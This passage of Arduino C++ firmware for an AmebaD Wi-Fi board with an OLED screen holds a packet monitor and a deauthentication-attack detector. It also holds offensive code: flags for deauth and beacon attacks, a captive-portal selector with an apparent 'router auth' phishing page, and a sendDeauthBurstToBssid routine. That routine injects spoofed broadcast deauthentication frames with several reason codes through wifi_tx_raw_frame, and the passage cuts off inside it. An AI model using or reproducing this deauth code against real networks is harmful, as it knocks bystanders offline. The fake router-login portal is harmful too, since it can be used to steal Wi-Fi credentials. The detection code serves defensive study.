  Serial.print("[PacketDetect] Applied preview channel: "); Serial.println(g_packetDetectChannel);
}

// 
static String getChannelBand(int channel) {
  if (channel >= 1 && channel <= 14) {
    return "2.4G";
  } else if (channel >= 36 && channel <= 64) {
    return "5G";
  } else if (channel >= 100 && channel <= 144) {
    return "5G";
  } else if (channel >= 149 && channel <= 165) {
    return "5G";
  }
  return "Unknown";
}

// 
static void updateKeyStates() {
  unsigned long currentTime = millis();
  
  // UP
  bool upKeyCurrentState = (digitalRead(BTN_UP) == LOW);
  if (upKeyCurrentState && !g_upKeyPressed) {
    // 
    g_upKeyPressed = true;
    g_upKeyPressTime = currentTime;
    // 
    g_showUpIndicator = true;
    g_showDownIndicator = false; // 
    // （）
    switchToNextPacketDetectChannel();
  } else if (upKeyCurrentState && g_upKeyPressed) {
    // ，
    if (currentTime - g_upKeyPressTime >= 500) { // 500ms
      if (!g_channelPreviewMode) {
        g_channelPreviewMode = true;
        // 
        g_previewChannel = g_packetDetectChannel;
        g_usingPreview24G = g_using24G;
        g_previewChannelListIndex = g_currentChannelListIndex;
        g_lastPreviewSwitchTime = currentTime;
      } else if (currentTime - g_lastPreviewSwitchTime >= 300) { // 300ms
        if (!g_previewSwitchPending) {
          g_previewSwitchPending = true;
          previewNextChannel();
          g_lastPreviewSwitchTime = currentTime;
        } else if (currentTime - g_lastPreviewSwitchTime >= 50) {
          // 50ms，
          g_previewSwitchPending = false;
        }
      }
    }
  } else if (!upKeyCurrentState && g_upKeyPressed) {
    // 
    g_upKeyPressed = false;
    g_previewSwitchPending = false; // 
    // ，
    if (!g_channelPreviewMode) {
      g_showUpIndicator = false;
    }
    if (g_channelPreviewMode) {
      // 
      applyPreviewChannel();
      g_channelPreviewMode = false;
      g_showUpIndicator = false; // 
    }
  }
  
  // DOWN
  bool downKeyCurrentState = (digitalRead(BTN_DOWN) == LOW);
  if (downKeyCurrentState && !g_downKeyPressed) {
    // 
    g_downKeyPressed = true;
    g_downKeyPressTime = currentTime;
    // 
    g_showDownIndicator = true;
    g_showUpIndicator = false; // 
    // （）
    switchToPrevPacketDetectChannel();
  } else if (downKeyCurrentState && g_downKeyPressed) {
    // ，
    if (currentTime - g_downKeyPressTime >= 500) { // 500ms
      if (!g_channelPreviewMode) {
        g_channelPreviewMode = true;
        // 
        g_previewChannel = g_packetDetectChannel;
        g_usingPreview24G = g_using24G;
        g_previewChannelListIndex = g_currentChannelListIndex;
        g_lastPreviewSwitchTime = currentTime;
      } else if (currentTime - g_lastPreviewSwitchTime >= 300) { // 300ms
        if (!g_previewSwitchPending) {
          g_previewSwitchPending = true;
          previewPrevChannel();
          g_lastPreviewSwitchTime = currentTime;
        } else if (currentTime - g_lastPreviewSwitchTime >= 50) {
          // 50ms，
          g_previewSwitchPending = false;
        }
      }
    }
  } else if (!downKeyCurrentState && g_downKeyPressed) {
    // 
    g_downKeyPressed = false;
    g_previewSwitchPending = false; // 
    // ，
    if (!g_channelPreviewMode) {
      g_showDownIndicator = false;
    }
    if (g_channelPreviewMode) {
      // 
      applyPreviewChannel();
      g_channelPreviewMode = false;
      g_showDownIndicator = false; // 
    }
  }
}

/**
 * @brief Draw a dashed line on the OLED display.
 * @param x1 Start x
 * @param y1 Start y
 * @param x2 End x
 * @param y2 End y
 * @param dashLength Length of each dash in pixels (default 2)
 */
static void drawDashedLine(int x1, int y1, int x2, int y2, int dashLength = 2) {
  int dx = abs(x2 - x1);
  int dy = abs(y2 - y1);
  int steps = (dx > dy) ? dx : dy;
  
  for (int i = 0; i < steps; i += dashLength * 2) {
    int x = x1 + (x2 - x1) * i / steps;
    int y = y1 + (y2 - y1) * i / steps;
    int nextI = i + dashLength;
    if (nextI > steps) nextI = steps;
    int endX = x1 + (x2 - x1) * nextI / steps;
    int endY = y1 + (y2 - y1) * nextI / steps;
    display.drawLine(x, y, endX, endY, SSD1306_WHITE);
  }
}

/**
 * @brief Render packet history chart and average line on OLED.
 */
static void drawPacketChart() {
  // ：x=0-127, y=20-60 (40，packets)
  int chartX = 0;
  int chartY = 20;
  int chartWidth = 128;
  int chartHeight = 40;
  
  // 
  display.drawRect(chartX, chartY, chartWidth, chartHeight, SSD1306_WHITE);
  
  // 
  unsigned long maxPackets = 1;
  unsigned long totalPackets = 0;
  int validDataCount = 0;
  for (int i = 0; i < 64; i++) {
    if (g_packetDetectHistory[i] > maxPackets) {
      maxPackets = g_packetDetectHistory[i];
    }
    if (g_packetDetectHistory[i] > 0) {
      totalPackets += g_packetDetectHistory[i];
      validDataCount++;
    }
  }
  
  // 
  unsigned long averagePackets = validDataCount > 0 ? totalPackets / validDataCount : 0;
  
  // （64，2）
  int pointWidth = 2;
  int maxPoints = chartWidth / pointWidth;
  int startIndex = (g_packetDetectHistoryIndex - maxPoints + 64) % 64;
  
  for (int i = 0; i < maxPoints; i++) {
    int dataIndex = (startIndex + i) % 64;
    unsigned long packetCount = g_packetDetectHistory[dataIndex];
    
    if (packetCount > 0) {
      // 
      int barHeight = (int)((float)packetCount / (float)maxPackets * (chartHeight - 2));
      if (barHeight < 1) barHeight = 1;
      if (barHeight > chartHeight - 2) barHeight = chartHeight - 2;
      
      // 
      int x = chartX + 1 + i * pointWidth;
      int y = chartY + chartHeight - 1 - barHeight;
      display.fillRect(x, y, pointWidth - 1, barHeight, SSD1306_WHITE);
    }
  }
  
  // （）
  if (averagePackets > 0 && maxPackets > 0) {
    int averageHeight = (int)((float)averagePackets / (float)maxPackets * (chartHeight - 2));
    if (averageHeight > 0 && averageHeight < chartHeight - 2) {
      int averageY = chartY + chartHeight - 1 - averageHeight;
      drawDashedLine(chartX + 1, averageY, chartX + chartWidth - 1, averageY, 3);
    }
  }
}

/**
 * @brief Initialize attack detection in promiscuous mode and set filters.
 *
 * Resets counters, sets initial channel/group, configures AmebaD promisc
 * filters and callbacks for deauth/disassoc detection.
 */
static void startAttackDetection() {
  g_detectDeauthCount = 0;
  g_detectDisassocCount = 0;
  g_attackDetectRunning = true;
  WiFi.macAddress(g_localMacForDetect);
  Serial.println("[Detect] Starting attack detection...");
  Serial.print("[Detect] Local MAC: ");
  for (int i = 0; i < 6; i++) { Serial.print(g_localMacForDetect[i], HEX); if (i<5) Serial.print(":"); }
  Serial.println();
  // （AmebaD）
  WiFi.disablePowerSave();
  
  // ，
  int total = 0;
  const uint8_t* channels = getCurrentChannelGroup(total);
  if (total > 0) {
    wext_set_channel(WLAN0_NAME, channels[0]);
    Serial.print("[Detect] Set initial channel: "); Serial.println(channels[0]);
    Serial.print("[Detect] Channel group: "); Serial.println(getCurrentChannelGroupName());
  }
  
  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
    {
      // 
      promisc_filter_t pf; pf.filter_mode = PROMISC_FILTER_MASK_MGMT;
      int rcF = wifi_set_promisc_filter(&pf);
      Serial.print("[Detect] wifi_set_promisc_filter(MGMT) rc="); Serial.println(rcF);
      
      // ，
      if (rcF != 0) {
        Serial.println("[Detect] Filter setup failed, trying without filter");
      }
      
      int rcR = wifi_set_promisc_filter_reason(1);
      Serial.print("[Detect] wifi_set_promisc_filter_reason(1) rc="); Serial.println(rcR);
      
      int rc = wifi_set_mgnt_rxfilter(1);
      Serial.print("[Detect] wifi_set_mgnt_rxfilter(1) rc="); Serial.println(rc);
    }
  #endif
  
  // 
  int rc = wifi_set_promisc(RTW_PROMISC_ENABLE_2, promiscDetectCallback, 1);
  Serial.print("[Detect] wifi_set_promisc(RTW_PROMISC_ENABLE_2, len=1) rc="); Serial.println(rc);
  
  // ，
  if (rc != 0) {
    Serial.println("[Detect] RTW_PROMISC_ENABLE_2 failed, trying RTW_PROMISC_ENABLE");
    rc = wifi_set_promisc(RTW_PROMISC_ENABLE, promiscDetectCallback, 1);
    Serial.print("[Detect] wifi_set_promisc(RTW_PROMISC_ENABLE, len=1) rc="); Serial.println(rc);
  }
  
  g_attackDetectLastChSwitchMs = millis();
  g_attackDetectLastDrawMs = 0;
  g_attackDetectChIndex = 0;

  // ，
}

static void stopAttackDetection() {
  Serial.println("[Detect] Stopping attack detection...");
  
  // 
  #if defined(RTW_PROMISC_DISABLE)
    {
      int rc = wifi_set_promisc(RTW_PROMISC_DISABLE, nullptr, 0);
      Serial.print("[Detect] wifi_set_promisc(DISABLE) rc="); Serial.println(rc);
    }
  #endif
  
  // 
  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
    {
      promisc_filter_t pf; pf.filter_mode = 0;
      wifi_set_promisc_filter(&pf);
      wifi_set_promisc_filter_reason(0);
      wifi_set_mgnt_rxfilter(0);
    }
  #endif
  
  // 
  g_attackDetectRunning = false;
  g_attackDetectLastDrawMs = 0;
  g_attackDetectLastChSwitchMs = 0;
  g_attackDetectChIndex = 0;
  g_detectStickyUntilMs = 0;
  g_lastDetectLogMs = 0;
  
  // 
  g_currentChannelGroup = CHANNEL_GROUP_24G_5G_COMMON;
  
  Serial.println("[Detect] Attack detection stopped and resources cleaned up");
}

// OLED：
void drawAttackDetectPage() {
  // UI
  g_detectUiMode = 0;
  g_recordsPage = 0;
  g_totalDeauth = 0;
  g_totalDisassoc = 0;
  g_suspects.clear();
  g_tempCounts.clear();
  g_promiscCbHits = 0;
  g_mgmtFramesSeen = 0;
  for (int i = 0; i < 16; i++) {
    g_subtypeHistogram[i] = 0;
  }
  g_evHead = 0;
  g_evTail = 0;
  g_lastDetectKind = 0;
  g_lastReason = 0;
  detect_border_always_on = false;
  detect_flash_remaining_toggles = 0;
  
  // 
  g_currentChannelGroup = CHANNEL_GROUP_24G_5G_COMMON;
  g_attackDetectChIndex = 0;
  
  startAttackDetection();
  
  const unsigned long drawInterval = 200;
  const unsigned long baseDwellMs = 1000; // 1s
  unsigned long dwellStartMs = millis();
  bool seenInDwell = false;
  bool initialPromptShown = false; // 
  
  while (true) {
    // 
    if (!initialPromptShown && g_attackDetectLastDrawMs > 0) {
      showModalMessage("Press UP", "Change ch group");
      initialPromptShown = true;
    }
    unsigned long now = millis();
    // ：
    while (g_evTail != g_evHead) {
      DetectEvent ev = g_evBuf[g_evTail];
      g_evTail = (g_evTail + 1) & 63;
      if (ev.kind == 0xC0) g_totalDeauth++; else if (ev.kind == 0xA0) g_totalDisassoc++;
      seenInDwell = true;
      // 
      int tIdx = -1; for (size_t j=0;j<g_tempCounts.size();j++){ bool eq=true; for(int k=0;k<6;k++) if (g_tempCounts[j].bssid[k]!=ev.mac[k]) {eq=false;break;} if(eq){tIdx=(int)j;break;} }
      if (tIdx==-1){ TempCount tc; memcpy(tc.bssid, ev.mac, 6); tc.d = (ev.kind==0xC0)?1:0; tc.a = (ev.kind==0xA0)?1:0; g_tempCounts.push_back(tc);} 
      else { if (ev.kind==0xC0) g_tempCounts[tIdx].d++; else g_tempCounts[tIdx].a++; }
      // BSSID>=5，/
      int cntIdx = (tIdx==-1) ? (int)g_tempCounts.size()-1 : tIdx;
      unsigned int sum = g_tempCounts[cntIdx].d + g_tempCounts[cntIdx].a;
      if (sum >= 5) {
        int sIdx = -1; for (size_t i=0;i<g_suspects.size();i++){ bool eq=true; for(int k=0;k<6;k++) if (g_suspects[i].bssid[k]!=ev.mac[k]) {eq=false;break;} if(eq){sIdx=(int)i;break;} }
        if (sIdx==-1){ 
          SuspectRecord rec; memcpy(rec.bssid, ev.mac, 6); rec.deauthCount = g_tempCounts[cntIdx].d; rec.disassocCount = g_tempCounts[cntIdx].a; rec.lastSeenMs = ev.ts; g_suspects.push_back(rec);
          // 
          if (!detect_border_always_on) {
            detect_border_always_on = true;
          }
          detect_flash_remaining_toggles = 4; // 
          detect_border_flash_visible = true;
        } 
        else { 
          g_suspects[sIdx].deauthCount += (ev.kind==0xC0); g_suspects[sIdx].disassocCount += (ev.kind==0xA0); g_suspects[sIdx].lastSeenMs = ev.ts; 
          // ，
        }
      }
    }

    // ：1.5s，；3.0s
    unsigned long dwellElapsed = now - dwellStartMs;
    unsigned long dwellLimit = seenInDwell ? (baseDwellMs * 2) : baseDwellMs;
    if (dwellElapsed >= dwellLimit) {
      int total = 0;
      const uint8_t* channels = getCurrentChannelGroup(total);
      if (total > 0) {
        g_attackDetectChIndex = (g_attackDetectChIndex + 1) % total;
        int ch = channels[g_attackDetectChIndex];
        wext_set_channel(WLAN0_NAME, ch);
        Serial.print("[Detect] Switch channel -> "); Serial.println(ch);
        dwellStartMs = now; seenInDwell = false; g_tempCounts.clear();
      }
    }

    if (now - g_attackDetectLastDrawMs >= drawInterval) {
      g_attackDetectLastDrawMs = now;
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);

      int total = 0;
      const uint8_t* channels = getCurrentChannelGroup(total);
      int curCh = (total > 0 ? channels[g_attackDetectChIndex] : 0);

      if (g_detectUiMode == 0) {
        // （ drawWebTestMain ：y=12,28,44,60）
        const char* t1 = "[Detecting]"; int w1 = u8g2_for_adafruit_gfx.getUTF8Width(t1); int x1 = (display.width()-w1)/2; if (x1<0) x1=0;
        u8g2_for_adafruit_gfx.setCursor(x1, 12); u8g2_for_adafruit_gfx.print(t1);
        String t2 = String("Listen CH: ") + String(curCh) + "/" + getCurrentChannelGroupShortName(); int w2 = u8g2_for_adafruit_gfx.getUTF8Width(t2.c_str()); int x2=(display.width()-w2)/2; if(x2<0)x2=0;
        u8g2_for_adafruit_gfx.setCursor(x2, 28); u8g2_for_adafruit_gfx.print(t2);
        const char* t3 = "View suspects"; int w3 = u8g2_for_adafruit_gfx.getUTF8Width(t3); 
        // +，
        int arrowWidth = 0; // 
        int spacing = 5; // 
        int totalWidth = w3 + spacing + arrowWidth;
        int x3 = (display.width() - totalWidth) / 2; if(x3<0) x3=0;
        u8g2_for_adafruit_gfx.setCursor(x3, 44); u8g2_for_adafruit_gfx.print(t3);
        // （，）
        int arrowY = 44 - 8; // y=44，，10px，4
        int arrowX = x3 + w3 + spacing; // 
        display.fillTriangle(arrowX, arrowY, arrowX, arrowY+6, arrowX+6, arrowY+3, SSD1306_WHITE);
        
        // "View suspects"：
        // ：
        // - 
        // - SSID/MAC，（4）
        {
          bool should_draw_border = false;
          if (detect_border_always_on && !g_suspects.empty()) {
            should_draw_border = true;
          }
          if (detect_flash_remaining_toggles > 0) {
            unsigned long now_ms = millis();
            // 150ms
            if (now_ms - detect_last_flash_toggle_ms >= 150UL) {
              detect_last_flash_toggle_ms = now_ms;
              detect_border_flash_visible = !detect_border_flash_visible;
              detect_flash_remaining_toggles--;
            }
            // （，）
            should_draw_border = detect_border_flash_visible;
          }
          if (should_draw_border) {
            int text_y_baseline = 44;
            int text_height = 10; // 
            int pad_x = 2;
            int pad_y = 2;
            int rect_x = x3 - pad_x - 1;
            int rect_y = text_y_baseline - text_height - pad_y;
            int rect_w = w3 + pad_x * 2 + 2;
            int rect_h = text_height + pad_y * 2;
            int r = 3; // 
            display.drawRoundRect(rect_x, rect_y, rect_w, rect_h, r, SSD1306_WHITE);
          }
        }
        const char* t4 = "↓ Stats ↓"; int w4 = u8g2_for_adafruit_gfx.getUTF8Width(t4); int x4=(display.width()-w4)/2; if(x4<0)x4=0;
        u8g2_for_adafruit_gfx.setCursor(x4, 60); u8g2_for_adafruit_gfx.print(t4);
        

      } else if (g_detectUiMode == 1) {
        // （：y=12，y=28/44/60）
        u8g2_for_adafruit_gfx.setCursor(2, 12); u8g2_for_adafruit_gfx.print("《 Back");
        int pages = (int)g_suspects.size(); if (pages==0) pages=1;
        String mid = String(g_recordsPage + 1) + "/" + String(pages);
        int wm = u8g2_for_adafruit_gfx.getUTF8Width(mid.c_str()); int xm=(display.width()-wm)/2; if(xm<0)xm=0;
        u8g2_for_adafruit_gfx.setCursor(xm, 12); u8g2_for_adafruit_gfx.print(mid);
        int wr = u8g2_for_adafruit_gfx.getUTF8Width("Page 》"); u8g2_for_adafruit_gfx.setCursor(display.width()-wr-2, 12); u8g2_for_adafruit_gfx.print("Page 》");
        if (!g_suspects.empty()) {
          int idx = g_recordsPage % (int)g_suspects.size();
          // SSID MAC y=28（）
          char macBuf[20]; snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
            g_suspects[idx].bssid[0], g_suspects[idx].bssid[1], g_suspects[idx].bssid[2], g_suspects[idx].bssid[3], g_suspects[idx].bssid[4], g_suspects[idx].bssid[5]);
          String label = String(macBuf);
          for (size_t i=0;i<scan_results.size();i++){ bool eq=true; for(int k=0;k<6;k++) if (scan_results[i].bssid[k]!=g_suspects[idx].bssid[k]) {eq=false;break;} if(eq){ label=scan_results[i].ssid; break; } }
          static int scrollX = 0; static unsigned long lastScrollMs = 0; const int scrollDelay = 120; // ms
          int textW = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
          if (textW <= display.width()-2) {
            int xl=(display.width()-textW)/2; if(xl<0) xl=0; u8g2_for_adafruit_gfx.setCursor(xl, 28); u8g2_for_adafruit_gfx.print(label);
            scrollX = 0; // 
          } else {
            if (millis() - lastScrollMs > (unsigned)scrollDelay) { scrollX = (scrollX + 2) % (textW + 16); lastScrollMs = millis(); }
            // 
            int startX = scrollX;
            // ：（UTF8，）
            // startX 
            u8g2_for_adafruit_gfx.setCursor(2 - startX, 28); u8g2_for_adafruit_gfx.print(label);
            // +
            u8g2_for_adafruit_gfx.setCursor(2 - startX + textW + 16, 28); u8g2_for_adafruit_gfx.print(label);
          }
          // Deauth/Disassoc y=44/60
          String s2 = String("Deauth: ") + String(g_suspects[idx].deauthCount);
          String s3 = String("Disassoc: ") + String(g_suspects[idx].disassocCount);
          u8g2_for_adafruit_gfx.setCursor(2, 44); u8g2_for_adafruit_gfx.print(s2);
          u8g2_for_adafruit_gfx.setCursor(2, 60); u8g2_for_adafruit_gfx.print(s3);
        } else {
          const char* empt = "No records"; int we=u8g2_for_adafruit_gfx.getUTF8Width(empt); int xe=(display.width()-we)/2; if(xe<0) xe=0;
          u8g2_for_adafruit_gfx.setCursor(xe, 36); u8g2_for_adafruit_gfx.print(empt);
        }
      } else {
        // （ y=12,28,44,60）
        const char* backUp = "↑ Back ↑"; int wb=u8g2_for_adafruit_gfx.getUTF8Width(backUp); int xb=(display.width()-wb)/2; if(xb<0) xb=0;
        u8g2_for_adafruit_gfx.setCursor(xb, 12); u8g2_for_adafruit_gfx.print(backUp);
        String s2 = String("Deauth: ") + String(g_totalDeauth);
        String s3 = String("Disassoc: ") + String(g_totalDisassoc);
        String s4 = String("Total: ") + String(g_totalDeauth + g_totalDisassoc);
        int w2=u8g2_for_adafruit_gfx.getUTF8Width(s2.c_str()); int x2=(display.width()-w2)/2; if(x2<0)x2=0;
        int w3=u8g2_for_adafruit_gfx.getUTF8Width(s3.c_str()); int x3s=(display.width()-w3)/2; if(x3s<0)x3s=0;
        int w4=u8g2_for_adafruit_gfx.getUTF8Width(s4.c_str()); int x4s=(display.width()-w4)/2; if(x4s<0)x4s=0;
        u8g2_for_adafruit_gfx.setCursor(x2, 28); u8g2_for_adafruit_gfx.print(s2);
        u8g2_for_adafruit_gfx.setCursor(x3s, 44); u8g2_for_adafruit_gfx.print(s3);
        u8g2_for_adafruit_gfx.setCursor(x4s, 60); u8g2_for_adafruit_gfx.print(s4);
      }

      // ，

      // （1s）
      static unsigned long lastPrintedDeauth = 0, lastPrintedDis = 0;
      if ((g_detectDeauthCount != lastPrintedDeauth) || (g_detectDisassocCount != lastPrintedDis) || (now - g_lastDetectLogMs > 1000)) {
        Serial.print("[Detect] Ch="); Serial.print(curCh);
        Serial.print(" Deauth="); Serial.print((unsigned long)g_totalDeauth);
        Serial.print(" Disassoc="); Serial.print((unsigned long)g_totalDisassoc);
        Serial.print(" cbHits="); Serial.print((unsigned long)g_promiscCbHits);
        Serial.print(" mgmtSeen="); Serial.print((unsigned long)g_mgmtFramesSeen);
        Serial.print(" subtypes[");
        for (int s = 0; s < 16; s++) { if (g_subtypeHistogram[s]) { Serial.print(s); Serial.print(":"); Serial.print(g_subtypeHistogram[s]); Serial.print(" "); } }
        Serial.print("]");
        if (g_lastDetectKind == 0xC0 || g_lastDetectKind == 0xA0) {
          Serial.print(" Last="); Serial.print(g_lastDetectKind == 0xC0 ? "Deauth" : "Disassoc");
          Serial.print(" src=");
          for (int i = 0; i < 6; i++) { Serial.print(g_lastDetectSrc[i], HEX); if (i<5) Serial.print(":"); }
          Serial.print(" reason="); Serial.print(g_lastReason);
        }
        Serial.println();
        lastPrintedDeauth = g_totalDeauth;
        lastPrintedDis = g_totalDisassoc;
        g_lastDetectLogMs = now;
      }

      // （）
      // ""

      display.display();
    }

    // 
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) {
        // ：
        if (showConfirmModal("Stop detect?")) {
          // ，
          stopAttackDetection();
          // 
          g_suspects.clear();
          g_tempCounts.clear();
          g_totalDeauth = 0;
          g_totalDisassoc = 0;
          g_promiscCbHits = 0;
          g_mgmtFramesSeen = 0;
          for (int i = 0; i < 16; i++) {
            g_subtypeHistogram[i] = 0;
          }
          g_evHead = 0;
          g_evTail = 0;
          g_lastDetectKind = 0;
          g_lastReason = 0;
          detect_border_always_on = false;
          detect_flash_remaining_toggles = 0;
          break;
        }
        // 
      } else if (g_detectUiMode == 2) { 
        // ：
        break; 
      } else if (g_detectUiMode == 1) {
        // ：
        if (g_suspects.empty() || g_recordsPage <= 0) {
          // ：
          g_detectUiMode = 0;
          g_recordsPage = 0;
        } else {
          // 
          g_recordsPage -= 1;
        }
      }
    }
    

    
    if (digitalRead(BTN_OK) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) { g_detectUiMode = 1; g_recordsPage = 0; }
      else if (g_detectUiMode == 1) { if (!g_suspects.empty()) g_recordsPage = (g_recordsPage + 1) % (int)g_suspects.size(); }
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) g_detectUiMode = 2;
      else if (g_detectUiMode == 2) g_detectUiMode = 0;
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) {
        // ：
        switchToNextChannelGroup();
        
        // 
        showModalMessage("Listening...", getCurrentChannelGroupName());
        
        // ，
        dwellStartMs = millis();
        seenInDwell = false;
        g_tempCounts.clear();
      } else if (g_detectUiMode == 1) {
        g_detectUiMode = 0; // 
      } else if (g_detectUiMode == 2) {
        g_detectUiMode = 0; // 
      }
    }
    delay(10);
  }
  stopAttackDetection();
}

// 
void drawPacketDetectPage() {
  // 
  g_packetDetectChannel = 1; // 1
  startPacketDetection();
  
  const unsigned long drawInterval = 500; // 0.5
  bool initialPromptShown = false;
  
  while (true) {
    // 
    if (!initialPromptShown && g_packetDetectLastDrawMs > 0) {
      showModalMessage("Use UP/DOWN", "Change channel");
      initialPromptShown = true;
    }
    
    unsigned long now = millis();
    bool shouldRedraw = false;
    
    // （）
    static bool lastShowDownIndicator = false;
    static bool lastShowUpIndicator = false;
    static bool lastShowMgmtFrameIndicator = false;
    
    if (g_showDownIndicator != lastShowDownIndicator || 
        g_showUpIndicator != lastShowUpIndicator || 
        g_showMgmtFrameIndicator != lastShowMgmtFrameIndicator) {
      shouldRedraw = true;
      lastShowDownIndicator = g_showDownIndicator;
      lastShowUpIndicator = g_showUpIndicator;
      lastShowMgmtFrameIndicator = g_showMgmtFrameIndicator;
    }
    
    // 0.5，
    if (now - g_packetDetectLastDrawMs >= drawInterval || shouldRedraw) {
      // 
      if (now - g_packetDetectLastDrawMs >= drawInterval) {
        g_packetDetectLastDrawMs = now;
        
        // 
        g_packetDetectHistory[g_packetDetectHistoryIndex] = g_packetCount;
        g_packetDetectHistoryIndex = (g_packetDetectHistoryIndex + 1) % 64;
        
        // 
        g_packetCount = 0;
      }
      
      // 
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      
      // 
      unsigned long currentTime = millis();
      
      // （）
      if (g_showMgmtFrameIndicator && (currentTime - g_mgmtFrameIndicatorStartTime >= MGMT_FRAME_INDICATOR_TIME)) {
        g_showMgmtFrameIndicator = false;
      }
      
      // （）
      if (g_showDownIndicator) {
        u8g2_for_adafruit_gfx.setCursor(2, 10);
        u8g2_for_adafruit_gfx.print("[↓]");
      } else if (g_showUpIndicator) {
        u8g2_for_adafruit_gfx.setCursor(2, 10);
        u8g2_for_adafruit_gfx.print("[↑]");
      }
      
      // （）
      if (g_showMgmtFrameIndicator) {
        u8g2_for_adafruit_gfx.setCursor(110, 10);
        u8g2_for_adafruit_gfx.print("[*]");
      }
      
      // （）
      int displayChannel = g_channelPreviewMode ? g_previewChannel : g_packetDetectChannel;
      String channelInfo = String("CH: ") + String(displayChannel);
      if (g_channelPreviewMode) {
        channelInfo += "*";
      }
      channelInfo += " " + getChannelBand(displayChannel);
      // 
      int w1 = u8g2_for_adafruit_gfx.getUTF8Width(channelInfo.c_str());
      int x1 = (display.width() - w1) / 2;
      if (x1 < 0) x1 = 0;
      u8g2_for_adafruit_gfx.setCursor(x1, 10);
      u8g2_for_adafruit_gfx.print(channelInfo);
      
      // （packets）
      drawPacketChart();
      
      display.display();
    }
    
    // 
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      if (showConfirmModal("Stop monitor?")) {
        stopPacketDetection();
        break;
      }
    }
    
    // 
    updateKeyStates();
    
    delay(10);
  }
  
  stopPacketDetection();
}

// AP（）
enum APWebPageKind {
  AP_WEB_TEST = 0,          // （web_test_page.h）
  AP_WEB_ROUTER_AUTH = 1    // （web_router_auth_page.h）
};
int g_apSelectedPage = (int)AP_WEB_ROUTER_AUTH;

bool apWebPageSelectionMenu();

// AP（/）
static const char* g_apMenuItems[] = {"1.Modern", "2.Classic"};
static const int AP_MENU_ITEM_COUNT = sizeof(g_apMenuItems) / sizeof(g_apMenuItems[0]);
static int g_apBaseStartIndex = 0; // 
static int g_apSkipRelIndex = -1;   // （）

// ：AP
static void drawApMenuBase_NoFlush() {
  display.clearDisplay();
  display.setTextSize(1);
  // ：
  const char* title = "[Portal Style]";
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  {
    int w = u8g2_for_adafruit_gfx.getUTF8Width(title);
    int x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 12);
    u8g2_for_adafruit_gfx.print(title);
  }
  const int BASE_Y = 20; // Y
  for (int i = 0; i < AP_MENU_ITEM_COUNT; i++) {
    int menuIndex = i;
    int rectY = BASE_Y + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 12; // 
    if (i != g_apSkipRelIndex) {
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      u8g2_for_adafruit_gfx.setCursor(6, textY);
      u8g2_for_adafruit_gfx.print(g_apMenuItems[menuIndex]);
    }
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
}
// Web UI
bool deauthAttackRunning = false;
bool beaconAttackRunning = false;

// LED
unsigned long lastRedLEDBlink = 0;
const unsigned long RED_LED_BLINK_INTERVAL = 500; // （）
bool redLEDState = false;

// Structure to store target information
struct TargetInfo {
    uint8_t bssid[6];
    int channel;
    bool active;
};

std::vector<TargetInfo> smartTargets;
unsigned long lastScanTime = 0;
const unsigned long SCAN_INTERVAL = 600000; // 10 in milliseconds
// WiFi （5）
volatile bool g_scanDone = false;

// ===== Deauth helpers & constants =====
// ， std::map
struct ChannelBuckets {
  std::vector<std::vector<const uint8_t *>> buckets;
  struct ExtraBucket {
    int channel;
    std::vector<const uint8_t *> bssids;
  };
  std::vector<ExtraBucket> extras;
  ChannelBuckets() {
    buckets.resize(sizeof(allChannels) / sizeof(allChannels[0]));
  }
  void clearBuckets() {
    for (auto &b : buckets) b.clear();
    for (auto &e : extras) e.bssids.clear();
  }
  int indexForChannel(int ch) const {
    for (size_t i = 0; i < sizeof(allChannels) / sizeof(allChannels[0]); i++) {
      if (allChannels[i] == ch) return (int)i;
    }
    return -1;
  }
  void add(int ch, const uint8_t *bssid) {
    int idx = indexForChannel(ch);
    if (idx >= 0) {
      buckets[(size_t)idx].push_back(bssid);
    } else {
      // 
      for (auto &eb : extras) {
        if (eb.channel == ch) {
          eb.bssids.push_back(bssid);
          return;
        }
      }
      ExtraBucket nb;
      nb.channel = ch;
      nb.bssids.push_back(bssid);
      extras.push_back(std::move(nb));
    }
  }
};
static ChannelBuckets channelBucketsCache;
// MAC，"\xFF..."
const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
// （）
const uint16_t DEAUTH_REASONS[3] = {1, 4, 16};

// BSSID（DEAUTH_REASONS），burstTimes
// packetCount；interFrameDelayMs，CPU
inline __attribute__((always_inline)) void sendDeauthBurstToBssid(const uint8_t* bssid,
                                   int burstTimes,
                                   int &packetCount,
                                   int interFrameDelayMs) {
  DeauthFrame frame;
  // memcpy
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  size_t reasonCount = sizeof(DEAUTH_REASONS) / sizeof(DEAUTH_REASONS[0]);
  if (interFrameDelayMs > 0) {
    for (int burst = 0; burst < burstTimes; burst++) {
      for (size_t r = 0; r < reasonCount; r++) {
        frame.reason = DEAUTH_REASONS[r];
        wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
        packetCount++;
        delay(interFrameDelayMs);
      }
    }
  } else {
    // delay，，
    for (int burst = 0; burst < burstTimes; burst++) {
      for (size_t r = 0; r < reasonCount; r++) {
        frame.reason = DEAUTH_REASONS[r];
